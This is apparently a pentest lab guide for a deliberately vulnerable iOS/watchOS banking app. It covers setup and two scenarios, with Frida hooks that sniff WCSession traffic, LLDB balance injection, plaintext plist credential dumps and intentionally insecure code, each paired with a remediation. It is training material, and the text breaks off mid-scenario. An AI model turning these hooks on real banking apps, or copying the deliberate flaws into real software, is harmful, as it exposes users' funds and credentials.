# 🍏 Comprehensive Security Research Guide: Apple iOS & watchOS
## Nexora OmniWear — Apple Ecosystem Banking Security Assessment Lab
### Compliance Standards: OJK POJK 11/POJK.03/2022, Bank Indonesia SNAP QRIS, & PCI-DSS v4.0

---

## 📑 Table of Contents
1. [Architecture & Apple Binary Specifications](#1-architecture--apple-binary-specifications)
2. [Pentest Lab Setup Guide (Standalone watchOS & Paired Companion)](#2-pentest-lab-setup-guide-standalone-watchos--paired-companion)
   - [Track A: Setup Pentesting Standalone (Apple Watch + Mac Laptop — Tanpa iPhone)](#-track-a-setup-pentesting-standalone-apple-watch--mac-laptop--tanpa-iphone)
   - [Track B: Setup Pentesting Paired Dual-Device (Apple Watch + iPhone 11 Companion)](#-track-b-setup-pentesting-paired-dual-device-apple-watch--iphone-11-companion)
3. [Lab Setup Using Physical Devices (Real iPhone 11 & Apple Watch)](#3-lab-setup-using-physical-devices-real-iphone-11--apple-watch)
4. [Authentic Dummy Banking Application User Flow](#4-authentic-dummy-banking-application-user-flow)
5. [Master Writeup: 11 Apple iOS & watchOS Pentest Scenarios](#5-master-writeup-11-apple-ios--watchos-pentest-scenarios)
   - [Scenario 1: Plaintext Dictionary WCSession Interception & Replay (V-AP02)](#scenario-1-plaintext-dictionary-wcsession-interception--replay-v-ap02)
   - [Scenario 2: UserDefaults Plist Insecure Storage & Keychain Bypass (V-AP01)](#scenario-2-userdefaults-plist-insecure-storage--keychain-bypass-v-ap01)
   - [Scenario 3: Unthrottled Quick-PIN 4-Digit Brute-Force & Memory Exfiltration (V-AP03)](#scenario-3-unthrottled-quick-pin-4-digit-brute-force--memory-exfiltration-v-ap03)
   - [Scenario 4: High-Value (Rp 50.000.000) Out-of-Band 2FA Wire Transfer Hijack (V-AP04)](#scenario-4-high-value-rp-50000000-out-of-band-2fa-wire-transfer-hijack-v-ap04)
   - [Scenario 5: Sensor Wrist-Off Lockout Spoofing & Heart Rate Leak (V-AP05)](#scenario-5-sensor-wrist-off-lockout-spoofing--heart-rate-leak-v-ap05)
   - [Scenario 6: Contactless Dynamic SNAP QRIS Static Replay (V-AP06)](#scenario-6-contactless-dynamic-snap-qris-static-replay-v-ap06)
   - [Scenario 7: Remote Balance Injection via Insecure WatchBridge & Standalone IDOR (V-B01 / V-AP07)](#scenario-7-remote-balance-injection-via-insecure-watchbridge--standalone-idor-v-b01--v-ap07)
   - [Scenario 8: ATM Cardless Cash-Out OTP Brute-Force & Race Condition (V-L04)](#scenario-8-atm-cardless-cash-out-otp-brute-force--race-condition-v-l04)
   - [Scenario 9: Emergency Wrist Card Kill-Switch Desynchronization (V-W09)](#scenario-9-emergency-wrist-card-kill-switch-desynchronization-v-w09)
   - [Scenario 10: Client-Side iOS Jailbreak Anti-Tamper Detection Bypass (V-07)](#scenario-10-client-side-ios-jailbreak-anti-tamper-detection-bypass-v-07)
   - [Scenario 11: CISO Governance & Audit Compliance Assessment (POJK 11 / PCI-DSS v4.0)](#scenario-11-ciso-governance--audit-compliance-assessment-pojk-11--pci-dss-v40)
6. [Panduan Pentest Standalone watchOS + Mac (Tanpa Companion iPhone)](#6-panduan-pentest-standalone-watchos--mac-tanpa-companion-iphone)
   - [Standalone Challenge 1: Forensic Sandbox Plist & Cache Dump via simctl (Pillar 1)](#standalone-challenge-1-forensic-sandbox-plist--cache-dump-via-simctl-pillar-1)
   - [Standalone Challenge 2: Direct Cleartext Wi-Fi HTTP MITM & Reversal via Burp Suite (Pillar 2)](#standalone-challenge-2-direct-cleartext-wi-fi-http-mitm--reversal-via-burp-suite-pillar-2)
   - [Standalone Challenge 3: Standalone Runtime Memory Swizzling via LLDB & Frida (Pillar 3)](#standalone-challenge-3-standalone-runtime-memory-swizzling-via-lldb--frida-pillar-3)
   - [Standalone Challenge 4: Standalone ATM Double-Dispense Race Condition via Python Multi-threading (Pillar 4)](#standalone-challenge-4-standalone-atm-double-dispense-race-condition-via-python-multi-threading-pillar-4)
   - [Standalone Challenge 5: Standalone Wrist BOLA / IDOR Account Peeking via Deep Link & Direct API (Pillar 4)](#standalone-challenge-5-standalone-wrist-bola--idor-account-peeking-via-deep-link--direct-api-pillar-4)
7. [Frida & Cycript Cheatsheet for iOS & watchOS](#7-frida--cycript-cheatsheet-for-ios--watchos)
8. [Regulatory Compliance Matrix & Enterprise Remediation](#8-regulatory-compliance-matrix--enterprise-remediation)

---

## 🏛️ 1. Architecture & Apple Binary Specifications

The Nexora Apple banking ecosystem features a hybrid architecture: **React Native (iOS Companion)** paired with **Native SwiftUI + WatchConnectivity (`WCSession`)** for Apple Watch:

```
┌─────────────────────────────────────────────────────────────┐
│                 Researcher Laptop / Host System             │
│            Local Air-Gapped Core Backend (Flask: 0.0.0.0:5000)│
└──────────────────────────────┬──────────────────────────────┘
                               │ HTTP REST (100% Offline LAN)
                               ▼
┌─────────────────────────────────────────────────────────────┐
│                 iPhone 11 (iOS 15.1 - 17.x)                 │
│  - React Native Companion (`nexora-ios-companion-release`)  │
│  - Native Bridge: `WatchBridge.swift` / `WatchBridge.m`     │
│  - Local DB & Token Cache (Keychain Bypass)                 │
└──────────────────────────────┬──────────────────────────────┘
                               │ Apple WCSession (Bluetooth LE)
                               ▼
┌─────────────────────────────────────────────────────────────┐
│             Apple Watch Series 9 / Ultra (watchOS 9.0+)     │
│  - Target Victim: Native SwiftUI Target (`NexoraWatch`)   │
│  - Insecure Storage: `UserDefaults.standard` Plist          │
│  - Quick-PIN Pad 3x4 & SNAP QRIS Display                    │
│  - Optical PPG Pulse Sensor & Wrist-Off Gatekeeper          │
│  - High-Value 2FA Approval Modal (Rp 50.000.000 Transfer)   │
│  - ATM Cardless Cash-Out & Emergency Wrist Card Kill-Switch  │
└─────────────────────────────────────────────────────────────┘
```

### Official Release Binaries
All binaries can be downloaded directly from the [**GitHub Releases Tab**](https://github.com/angganovryanputra/nexora-private-banking/releases/latest):

| File Name | Target Hardware | Format & Role |
|---|---|---|
| **`nexora-ios-companion-release.ipa`** | iPhone 11 / iOS 15.1+ | Production-built iOS installer for sideloading (AltStore / Sideloadly). |
| **`Nexora-watchOS-Bundle.zip`** | Apple Watch / Xcode | Native SwiftUI Watch App bundle (`NexoraWatch`) + bridging headers for direct compilation and debugging in Xcode. |
| **`SHA256SUMS.txt`** | All Artifacts | Cryptographic SHA-256 verification hashes for chain of custody preservation. |

---

## 💻 2. Pentest Lab Setup Guide (Standalone watchOS & Paired Companion)

Panduan definitif penyiapan lingkungan riset keamanan dan assessment lab **Nexora OmniWear** pada macOS menggunakan Xcode. Panduan ini dirancang untuk dua moda operasional mandiri:
- **Track A: Setup Pentesting Standalone (Apple Watch + Mac Laptop — Tanpa iPhone)** — Jalur tercepat untuk riset smartwatch independen.
- **Track B: Setup Pentesting Paired Dual-Device (Apple Watch + iPhone 11 Companion)** — Jalur pengujian ekosistem perbankan lengkap.

---

### 🅰️ TRACK A: Setup Pentesting Standalone (Apple Watch + Mac Laptop — Tanpa iPhone)

Metode ini ditujukan bagi security researcher yang ingin menguji Apple Watch secara mandiri langsung dari laptop Mac (menggunakan Simulator atau Apple Watch fisik), **100% tanpa memerlukan emulator/perangkat iPhone**.

#### A.1 Prasyarat & Toolchain macOS
Pastikan dependensi sistem berikut terpasang di Mac (mendukung Apple Silicon M1/M2/M3/M4 maupun Intel Core i7/i9):
1. **Xcode Suite**: Xcode 15+ / 16+ dengan Command Line Tools:
   ```bash
   xcode-select --install
   sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
   ```
2. **Unduh watchOS Simulator Runtime di Xcode**:
   Secara default, Xcode tidak mengunduh runtime watchOS untuk menghemat ruang disk. Pasang melalui Terminal:
   ```bash
   xcodebuild -downloadPlatform watchOS
   ```
   Atau via menu GUI: **Xcode** → **Settings...** (`Cmd + ,`) → tab **Platforms** → klik **`+`** → pilih **watchOS** → **Download & Install**.
3. **Python 3 Backend Engine**:
   ```bash
   python3 --version # >= 3.10
   pip3 install flask werkzeug requests
   ```

#### A.2 Inisialisasi Core Banking Backend & Verifikasi SQLite
Smartwatch berkomunikasi langsung via HTTP REST (`WatchNetworkManager.swift`) ke core backend Flask.
1. **Jalankan Backend Service**:
   ```bash
   cd backend
   python3 server.py
   ```
   Backend aktif dan mendengarkan pada `http://0.0.0.0:5000`.
2. **Verifikasi Database SQLite (`nexora_vault.db`)**:
   ```bash
   sqlite3 backend/nexora_vault.db "SELECT account_number, username, balance FROM users WHERE username = 'alexander.vance';"
   ```
   **Output**:
   ```text
   NX-8492014|alexander.vance|888888000.0
   ```
   Nasabah primer Alexander Vance terkonfigurasi dengan rekening `NX-8492014` dan saldo awal `Rp 888.888.000` (IDR).
3. **Verifikasi Endpoint Saldo REST**:
   ```bash
   curl -s http://127.0.0.1:5000/check_balance/NX-8492014
   ```
   Respon JSON:
   ```json
   {"accountNumber":"NX-8492014","balance":888888000.0,"currency":"IDR"}
   ```

#### A.3 Membuka & Menjalankan Skema Standalone `NexoraWatch` di Xcode
1. Buka workspace di Xcode:
   ```bash
   open ios/VulnerableBankApp.xcworkspace
   ```
2. Pada selector scheme di toolbar atas Xcode (sebelah tombol Run ▶️), pilih scheme **`NexoraWatch`** (bukan `VulnerableBankApp`).
3. Pilih destination simulator watchOS mandiri, misalnya: **Apple Watch Series 9 (45mm)** atau **Apple Watch Ultra 2 (49mm)**.
4. Tekan **Cmd + R** untuk build dan jalankan. Simulator Apple Watch akan terbuka dan langsung menampilkan antarmuka perbankan Nexora.

#### A.4 Konfigurasi Proxy Burp Suite untuk watchOS HTTP Traffic
1. Buka Burp Suite di Mac, pastikan Proxy Listener aktif pada `0.0.0.0:8080`.
2. Karena watchOS simulator berbagi network interface dengan macOS, arahkan traffic HTTP ke proxy Mac, atau arahkan base URL pada `InsecureStorage.swift` / menu interaktif jam.
3. Karena `Info.plist` target `NexoraWatch` memuat:
   ```xml
   <key>NSAppTransportSecurity</key>
   <dict>
       <!-- INTENTIONALLY INSECURE (lab): allow cleartext HTTP -->
       <key>NSAllowsArbitraryLoads</key>
       <true/>
   </dict>
   ```
   Traffic HTTP berjalan tanpa halangan enkripsi TLS mandatori, memungkinkan inspeksi dan manipulasi paket seketika di Burp Suite.

#### A.5 Ekstraksi Data Sandboxed Container via `simctl`
Gunakan utilitas bawaan Xcode `simctl` untuk mengakses media penyimpanan sandboxed Apple Watch:
```bash
CONTAINER_DIR=$(xcrun simctl get_app_container booted com.nexorabank.omniwear.watchkitapp data)
echo "Sandboxed Container: $CONTAINER_DIR"
cd "$CONTAINER_DIR"
plutil -p Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist
```

#### A.6 Penyiapan Runtime Debugger LLDB & Frida untuk Watch
Pasang debugger ke proses smartwatch yang sedang berjalan:
```bash
# Debugger bawaan Apple
lldb -n NexoraWatch
# Frida Dynamic Instrumentation
frida -n NexoraWatch -l scripts/frida_bypass_wrist.js
```

---

### 🅱️ TRACK B: Setup Pentesting Paired Dual-Device (watchOS + iPhone 11 Companion)

Metode ini ditujukan bagi pengujian ekosistem perbankan lengkap: komunikasi Bluetooth LE `WCSession`, push notifikasi otorisasi 2FA transfer dana, dan sinkronisasi status kartu virtual.

#### B.1 Scaffolding React Native iOS & CocoaPods
Scaffold dependensi JavaScript dan native pod companion app:
```bash
npm install --legacy-peer-deps
cd ios
pod install --repo-update
cd ..
```

#### B.2 Otomasi Target Apple Watch (`add_watch_target.rb`)
Script `ios/add_watch_target.rb` secara otomatis mengintegrasikan target watchOS ke dalam `VulnerableBankApp.xcodeproj`:
1. Jalankan script otomasi:
   ```bash
   cd ios
   ruby add_watch_target.rb
   pod install
   cd ..
   ```
2. Skrip akan menyelaraskan bundle identifier:
   - iOS Companion: `com.nexorabank.omniwear`
   - Apple Watch: `com.nexorabank.omniwear.watchkitapp`
   - `WKCompanionAppBundleIdentifier`: `com.nexorabank.omniwear`
   - Mendaftarkan seluruh 16 file Swift, Info.plist, dan Assets.xcassets.

#### B.3 Konfigurasi Virtual Paired Simulator (iPhone 11/15 + Apple Watch)
1. Di Xcode, buka **Window** → **Devices and Simulators** (`Cmd + Shift + 2`).
2. Pilih tab **Simulators**, klik tombol **`+`** di pojok kiri bawah.
3. Buat simulator iPhone:
   - **Device Type**: `iPhone 15 Pro` atau `iPhone 11`.
   - Centang opsi: **Pair Apple Watch**.
   - **Watch Device Type**: `Apple Watch Series 9 (45mm)` atau `Apple Watch Ultra 2 (49mm)`.
4. Klik **Create**. Xcode akan membuat tautan virtual Bluetooth LE antar kedua simulator.

#### B.4 Menjalankan Aplikasi & Dual-Mode Network Configuration
1. Jalankan target iOS: pilih scheme **`VulnerableBankApp`** → pilih `iPhone 15 Pro Lab` → tekan `Cmd + R`.
2. Jalankan target Watch: pilih scheme **`NexoraWatch`** → pilih `Apple Watch Series 9 Lab` → tekan `Cmd + R`.
3. Verifikasi status sinkronisasi pada header bar smartwatch: lingkaran hijau bertuliskan **WCSync** atau **HTTP**.

#### B.5 Verifikasi Transaksi End-to-End pada SQLite Database
Lakukan transaksi SNAP QRIS Rp 75.000 pada jam tangan, lalu periksa mutasi di database:
```bash
sqlite3 backend/nexora_vault.db "SELECT id, from_account, to_account, amount, description, timestamp FROM transactions ORDER BY id DESC LIMIT 1;"
```
Hasil:
```text
|NX-8492014|ID1020021189360|75000.0|SNAP QRIS Payment - Warung Kopi Seduh|...
```

#### B.6 Matriks Resolusi Masalah Xcode (Troubleshooting Matrix)
| Error Message in Xcode | Root Cause | Verified Resolution |
|---|---|---|
| `No such module 'React'` on `NexoraWatch` | The watchOS target is attempting to link React Native iOS pods. | `NexoraWatch` is 100% native SwiftUI and `URLSession`. Ensure `NexoraWatch` is **not** included as a target inside `ios/Podfile`. Pods belong exclusively to `VulnerableBankApp`. |
| `Signing for 'NexoraWatch' requires a development team` | Code signing team is unselected or provisioning profile expired. | In Xcode, select the root project `VulnerableBankApp` → Select `NexoraWatch` target → **Signing & Capabilities** → Set **Team** to your **Personal Team** (Free Apple ID) and change Bundle Identifier prefix if required. Repeat for `VulnerableBankApp`. |
| `WCSession is not paired` or `sessionWatchAppNotInstalled` | Bundle identifier mismatch between iOS app and watchOS companion. | The companion bundle ID must strictly match: iOS: `com.nexorabank.omniwear`, Watch: `com.nexorabank.omniwear.watchkitapp`. Run `ruby add_watch_target.rb` to automatically repair identifier alignment. |
| `App Transport Security has blocked a cleartext HTTP connection` | ATS block due to missing `NSAllowsArbitraryLoads`. | Verify `Info.plist` in both `ios/NexoraWatch/Info.plist` and `ios/VulnerableBankApp/Info.plist` contains `<key>NSAllowsArbitraryLoads</key><true/>`. |
| `Cycle inside VulnerableBankApp; building could produce unreliable results` | Build order cycle between Embed Watch Content and compilation. | In `VulnerableBankApp` Build Phases, ensure **Embed Watch Content** is positioned *after* **Compile Sources** and **Link Binary With Libraries**. |
| `Destination Apple Watch Series 9 is not valid` | Deployment target mismatch. | In `NexoraWatch` target **Build Settings**, set **watchOS Deployment Target** to `watchOS 9.0` or `watchOS 10.0` matching your installed simulator runtime. |

---

## 📱 3. Lab Setup Using Physical Devices (Real iPhone 11 & Apple Watch)

Deploying to physical hardware (e.g. iPhone 11 and Apple Watch Series 9) provides realistic optical sensor testing (PPG heart rate), authentic Bluetooth LE WCSession synchronization, and true hardware off-wrist gatekeeper evaluation.

### Method A: Sideloading via Sideloadly / AltStore (Free Apple ID)
1. Download **`nexora-ios-companion-release.ipa`** from [GitHub Releases](https://github.com/angganovryanputra/nexora-private-banking/releases/latest).
2. Download and launch [Sideloadly](https://sideloadly.io/) on your PC or Mac.
3. Connect your iPhone 11 via Lightning USB cable.
4. Drag-and-drop the `.ipa` file into Sideloadly.
5. Enter your free Apple ID and click **Start**.
6. On your iPhone 11: Go to **Settings** → **General** → **VPN & Device Management** → Trust your developer certificate.
7. Open Nexora Bank on iPhone. The paired Apple Watch will automatically synchronize the companion app!

### Method B: Direct Deployment via Xcode (Recommended for Researchers)
1. **Prepare Physical Devices**:
   - Connect iPhone 11 to your Mac via USB-to-Lightning cable.
   - Ensure your physical Apple Watch is powered on, on your wrist, unlocked, and paired via the iOS Watch app.
2. **Enable iOS Developer Mode**:
   - On iPhone: Navigate to **Settings** → **Privacy & Security** → Scroll down to **Developer Mode** → Toggle ON → Restart device.
   - After restart, unlock the phone and tap **Turn On** when prompted.
   - On Apple Watch: In watchOS 10+, navigate to **Settings** → **Privacy & Security** → **Developer Mode** → Toggle ON → Restart watch.
3. **Configure Code Signing**:
   - Open `ios/VulnerableBankApp.xcworkspace` in Xcode.
   - Select project **VulnerableBankApp** in the project navigator.
   - For **VulnerableBankApp** target: Go to **Signing & Capabilities** → Check **Automatically manage signing** → Select your **Personal Team**.
   - For **NexoraWatch** target: Repeat selection of your **Personal Team**.
   - If Apple reports bundle identifier unavailability, adjust bundle identifier prefix (e.g., `com.yourname.nexorabank.omniwear`).
4. **Compile and Deploy**:
   - Scheme selector: Select **`VulnerableBankApp`** → Destination: Your physical iPhone.
   - Press `Cmd + R` to compile and launch.
   - Scheme selector: Select **`NexoraWatch`** → Destination: Your physical Apple Watch.
   - Press `Cmd + R`. Xcode will compile the native watch app and install it onto your watch via Bluetooth!

### Method C: Physical Device Backend Routing & Wi-Fi Configuration
1. **Connect to Shared Wi-Fi Subnet**:
   - Ensure both the iPhone and your Mac running `python3 backend/server.py` are connected to the same Wi-Fi network.
   - Find your Mac's LAN IP:
     ```bash
     ipconfig getifaddr en0
     # Example: 192.168.1.105
     ```
2. **Verify Firewall Permissions**:
   - macOS Firewall must allow incoming TCP connections on port 5000:
     ```bash
     # Test from iPhone Safari browser:
     http://192.168.1.105:5000/check_balance/NX-8492014
     ```
   - If the JSON response renders in Safari, the backend is reachable from mobile devices.
3. **Configure Watch Backend URL**:
   - In `ios/NexoraWatch/InsecureStorage.swift`, update `defaultBackendUrl` with your Mac's LAN IP.
   - Alternatively, use the companion app's **Pentest Lab** → **API Gateway** setting to broadcast the IP to the Apple Watch via `WCSession`.

---

## 🧭 4. Authentic Dummy Banking Application User Flow

Nexora Watch replicates a premier private digital banking workflow:

```
┌────────────────────────────────────────────────────────┐
│               NEXORA APPLE WATCH USER FLOW             │
│                                                        │
│  [1. Lock Screen / Off-Wrist Gatekeeper]               │
│         │ (Wear watch on wrist)                        │
│         ▼                                              │
│  [2. Quick-PIN 4-Digit Dial] ───── (Input "1234")      │
│         │                                              │
│         ▼                                              │
│  [3. Platinum Private Dashboard]                       │
│       - Liquid Balance: Rp 888.888.000 (Alexander Vance)     │
│       - PPG Heart Rate: 74 BPM                         │
│       - Dual-Mode Network: HTTP URLSession + WCSession  │
│         │                                              │
│         ├─► [SNAP QRIS Pay] ──► Merchant QR Barcode    │
│         │                        NMID & 120s Timer     │
│         │                                              │
│         ├─► [Cardless ATM] ───► 6-Digit Cash-Out OTP   │
│         │                        Double-Dispense Race  │
│         │                                              │
│         ├─► [Card Freeze] ────► Emergency Kill-Switch  │
│         │                        Virtual Cards Locked  │
│         │                                              │
│         ├─► [Audit Lab] ──────► 21 Exploit Vectors     │
│         │                        5 Security Pillars    │
│         │                                              │
│         └─► [High-Value 2FA] ─► Rp 50.000.000 Wire     │
│                                  Haptic Dialog Modal   │
└────────────────────────────────────────────────────────┘
```

---

## 🎯 5. Master Writeup: 11 Apple iOS & watchOS Pentest Scenarios

---

### Scenario 1: Plaintext Dictionary WCSession Interception & Replay (V-AP02)
- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.8)
- **Vulnerability Standard**: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-294 (Authentication Bypass by Capture-replay), CWE-345 (Insufficient Verification of Data Authenticity), OWASP MASVS-STORAGE-1, OWASP MASVS-CRYPTO-1
- **Description**:
  The inter-device bridge between the iPhone Companion application (`NexoraBank`) and the Apple Watch client (`NexoraWatch`) utilizes Apple's native `WatchConnectivity` framework (`WCSession.defaultSession()`). In Nexora OmniWear, financial transaction instructions, real-time balance synchronizations, authorization tokens, and 2FA approval requests are exchanged as raw, unencrypted Foundation dictionaries (`[String: Any]`) across Bluetooth Low Energy (BLE) and Wi-Fi daemon links managed by iOS `companionappd`.
  Because application-layer cryptographic sealing (such as authenticated AES-256-GCM or ChaCha20-Poly1305) is completely omitted, an attacker with physical adjacency or running a debugger/instrumentation tool (LLDB or Frida) on either the watch or companion device can passively eavesdrop on all financial payloads, inject arbitrary forged banking balances (e.g. `Rp 13.370.000.000` / `13370000.0`), or capture and replay authorization messages (`TRIGGER_2FA`, `APPROVE_2FA`).
- **Root Cause Code**:
  - watchOS Receiver ([`ios/NexoraWatch/WatchSessionManager.swift`](file:///ios/NexoraWatch/WatchSessionManager.swift#L45-L67)):
    ```swift
    // VULNERABLE: WCSession packet handled without application-layer AES-GCM decryption or signature
    public func session(_ session: WCSession, didReceiveMessage message: [String : Any], replyHandler: @escaping ([String : Any]) -> Void) {
        DispatchQueue.main.async {
            self.lastReceivedPacket = message
            
            if let newBalance = message["balance"] as? Double {
                InsecureStorage.shared.saveBalance(newBalance)
            }
            if let action = message["action"] as? String {
                switch action {
                case "UPDATE_BALANCE":
                    if let payload = message["payload"] as? [String: Any],
                       let amount = payload["amount"] as? Double {
                        InsecureStorage.shared.saveBalance(amount)
                        replyHandler(["status": "BALANCE_UPDATED", "new_balance": amount, "currency": "IDR"])
                        return
                    }
                // ...
                }
            }
        }
    }
    ```
- **Proof-of-Concept Exploit (Mac Frida / LLDB & Interactive Watch Lab)**:
  1. **Method A: Frida Dynamic Hook & Balance Injection Script (`scripts/frida_sniff_wcsession.js`)**:
     Create and execute a Frida hook targeting `WCSession` messaging:
     ```javascript
     // scripts/frida_sniff_wcsession.js
     if (ObjC.available) {
         console.log("[*] Hooking WCSession on Apple Watch / iPhone...");
         var WCSession = ObjC.classes.WCSession;
         if (WCSession) {
             // 1. Sniff outgoing messages
             var sendMsg = WCSession["- sendMessage:replyHandler:errorHandler:"];
             if (sendMsg) {
                 Interceptor.attach(sendMsg.implementation, {
                     onEnter: function(args) {
                         var dict = new ObjC.Object(args[2]);
                         console.log("[🚨 V-AP02 SNIFF] Outgoing WCSession: " + dict.toString());
                     }
                 });
             }
             // 2. Tamper / Forge incoming balance injection
             var sessionManager = ObjC.classes.WatchSessionManager;
             if (sessionManager) {
                 var targetMethod = sessionManager["- session:didReceiveMessage:replyHandler:"];
                 if (targetMethod) {
                     Interceptor.attach(targetMethod.implementation, {
                         onEnter: function(args) {
                             var msg = new ObjC.Object(args[3]);
                             console.log("[🚨 V-AP02 TAMPER] Intercepted message: " + msg.toString());
                         }
                     });
                 }
             }
         }
     }
     ```
     Run via Frida on Mac:
     ```bash
     frida -n NexoraWatch -l scripts/frida_sniff_wcsession.js
     ```
  2. **Method B: LLDB In-Memory Balance Injection (Xcode Simulator or USB)**:
     Attach LLDB to `NexoraWatch` and call `saveBalance:` directly:
     ```lldb
     (lldb) expr -l objc -- [[InsecureStorage shared] saveBalance:13370000000.0]
     (lldb) expr -l objc -- [[WatchSessionManager shared] session:[WCSession defaultSession] didReceiveMessage:@{@"balance": @13370000000.0} replyHandler:^(id resp){}]
     (lldb) continue
     ```
  3. **Method C: Interactive Lab Trigger**:
     - On Apple Watch, open **Audit Lab -> P2 (Transport & Bridge)**.
     - Tap **V-AP02: WCSession Packet Sniff**.
     - Notice console status: `[V-AP02] Sniffed WCSession: action, amount, token`. The unencrypted inter-device dictionary keys are immediately dumped into memory and display!
- **Impact & SQLite Ledger Evidence**:
  - The attacker bypasses companion verification, injecting false banking ledger numbers or forging 2FA approvals. On the backend, unauthenticated bridge packets can trigger updates in `wearable_packets` table:
    ```bash
    python -c "import sqlite3; conn = sqlite3.connect('backend/nexora_vault.db'); cur = conn.cursor(); cur.execute('SELECT source_device, target_device, action, payload FROM wearable_packets ORDER BY id DESC LIMIT 2'); print(cur.fetchall())"
    ```
    Output confirms cleartext payloads logged across bridge channels without cryptographic envelopes.
- **Enterprise Remediation**:
  - Implement application-layer End-to-End Encryption (E2EE) over `WCSession`: Use Apple's `CryptoKit` to negotiate an ephemeral session key via ECDH (`Curve25519.KeyAgreement`), and wrap all messages in an authenticated AES-256-GCM container:
    ```swift
    // SECURE REMEDIATION: AES-256-GCM Cryptographic Envelope
    import CryptoKit

    public func sendEncryptedMessage(_ dict: [String: Any], key: SymmetricKey) throws {
        let plaintextData = try JSONSerialization.data(withJSONObject: dict)
        let sealedBox = try AES.GCM.seal(plaintextData, using: key)
        let encryptedPayload: [String: Any] = [
            "ciphertext": sealedBox.ciphertext.base64EncodedString(),
            "nonce": sealedBox.nonce.withUnsafeBytes { buffer in Data(buffer) }.base64EncodedString(),
            "tag": sealedBox.tag.base64EncodedString()
        ]
        WCSession.defaultSession.sendMessage(encryptedPayload, replyHandler: nil, errorHandler: nil)
    }
    ```
- **Regulatory Non-Compliance**:
  - **OJK POJK 11/POJK.03/2022 Pasal 26**: Kewajiban pengamanan data dalam transmisi antar subsistem perbankan dengan enkripsi standar industri yang kuat.
  - **PCI-DSS v4.0 Requirement 4.1 & Requirement 4.2**: Strong cryptography for cardholder data in transit over open, public, or wireless inter-device networks.

---

### Scenario 2: UserDefaults Plist Insecure Storage & Keychain Bypass (V-AP01)
- **Severity**: **HIGH** (`CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:N/SA:N` — Score: 7.8)
- **Vulnerability Standard**: CWE-312 (Cleartext Storage of Sensitive Information), CWE-922 (Insecure Storage), OWASP MASVS-STORAGE-1, OWASP MASVS-STORAGE-2
- **Description**:
  The Nexora OmniWear watch application stores sensitive authentication tokens (`nexora_auth_token`), cached financial balances (`nexora_cached_balance`), customer account numbers (`nexora_account_number`), Quick-PIN codes (`nexora_quick_pin`), and device pairing codes in unencrypted `UserDefaults.standard` property lists (`.plist`).
  Apple's `UserDefaults` provides zero cryptographic confidentiality—it serializes key-value pairs into standard XML/Binary Plist files within the sandbox (`Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist`). The application completely bypasses **Apple Keychain Services (`kSecClassGenericPassword`)** and the **Apple Watch Secure Enclave**. Any forensic extraction, backup inspection, or jailbroken environment can trivially dump cleartext user PINs (`1234`), bearer tokens, and account numbers.
- **Root Cause Code**:
  - Insecure Storage Implementation ([`ios/NexoraWatch/InsecureStorage.swift`](file:///ios/NexoraWatch/InsecureStorage.swift#L26-L53)):
    ```swift
    // VULNERABLE: Direct cleartext serialization into UserDefaults.standard plist
    override private init() {
        super.init()
        if defaults.string(forKey: keyPin) == nil {
            defaults.set("1234", forKey: keyPin) // Plaintext Quick-PIN
        }
        if defaults.double(forKey: keyBalance) == 0.0 {
            defaults.set(888888000.0, forKey: keyBalance) // Plaintext balance
        }
        if defaults.string(forKey: keyAccountNumber) == nil {
            defaults.set("NX-8492014", forKey: keyAccountNumber)
        }
    }

    public func saveAuthToken(_ token: String) {
        defaults.set(token, forKey: keyToken) // Plaintext Bearer JWT
        defaults.synchronize()
    }
    ```
- **Proof-of-Concept Exploit (Xcode simctl & Forensic Extraction)**:
  1. **Step 1 — Locate Sandboxed Container Directory**:
     ```bash
     CONTAINER_DIR=`xcrun simctl get_app_container booted com.nexorabank.omniwear.watchkitapp data`
     echo "Sandboxed Container: $CONTAINER_DIR"
     ```
  2. **Step 2 — Dump Cleartext Plist via plutil**:
     ```bash
     plutil -p "$CONTAINER_DIR/Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist"
     ```
     *Output Evidence*:
     ```text
     {
       "nexora_account_holder" => "Alexander Vance"
       "nexora_account_number" => "NX-8492014"
       "nexora_auth_token" => "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
       "nexora_cached_balance" => 888888000.0
       "nexora_currency" => "IDR"
       "nexora_quick_pin" => "1234"
       "nexora_pairing_code" => "839-201"
     }
     ```
  3. **Step 3 — Forensic Cache.db Inspection (`V-AP01b`)**:
     ```bash
     sqlite3 "$CONTAINER_DIR/Library/Caches/com.nexorabank.omniwear.watchkitapp/Cache.db" \
       "SELECT request_key, receiver_data FROM cfurl_cache_receiver_data LIMIT 3;"
     ```
  4. **Interactive Lab Trigger**:
     - Open **Audit Lab -> P1 (Storage & Cryptography)**.
     - Tap **V-AP01: Standalone Plist Dump**.
     - Notice console output: `[V-AP01] Standalone Plist Dump: PIN=1234, Acct=NX-8492014`.
- **Impact & SQLite Ledger Evidence**:
  - Complete compromise of customer credentials and session tokens on physical device loss or forensic imaging. The recovered `nexora_auth_token` allows direct authentication against the backend without the smartwatch:
    ```bash
    python -c "import sqlite3; conn = sqlite3.connect('backend/nexora_vault.db'); cur = conn.cursor(); cur.execute('SELECT username, account_number, balance FROM users WHERE account_number=\"NX-8492014\"'); print(cur.fetchone())"
    ```
    Output confirms account holder Alexander Vance matches the recovered `NX-8492014` plist record.
- **Enterprise Remediation**:
  - Migrate all sensitive secrets (PINs, auth tokens, session keys) to Apple Keychain Services using `kSecClassGenericPassword` with `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`:
    ```swift
    // SECURE REMEDIATION: Apple Keychain Services Integration
    import Security

    public func saveSecureToken(_ token: String, key: String) -> Bool {
        let data = Data(token.utf8)
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecValueData as String: data,
            kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
        ]
        SecItemDelete(query as CFDictionary)
        return SecItemAdd(query as CFDictionary, nil) == errSecSuccess
    }
    ```
- **Regulatory Non-Compliance**:
